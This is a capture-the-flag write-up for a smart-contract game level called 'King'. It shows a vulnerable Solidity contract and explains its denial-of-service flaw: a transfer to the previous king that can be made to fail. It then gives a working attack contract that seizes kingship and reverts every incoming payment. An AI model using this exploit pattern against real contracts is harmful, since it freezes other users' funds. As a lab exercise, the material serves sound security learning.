The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```


**SOLUTION:**


This is a classic example of DDoS with unexpected revert when the logic of the victim's contract involve sending funds to the previous "lead", which in this case is the king. A malicious user would create a smart contract with either:

-   a `fallback` / `receive` function that does `revert()`
-   or the absence of a `fallback` / `receive` function

Once the malicious user uses this smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter how much ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`

We compile and Deploy the following solidity smart contract to the Remix IDE, with the smart contract's hash address as the victim address:
```
pragma solidity ^0.8.0;

contract AttackKing {

    constructor(address _victim) payable {
        _victim.call{value: 10000000000000000 wei}("");
    }

    receive() external payable {
        revert();
    }
}
```

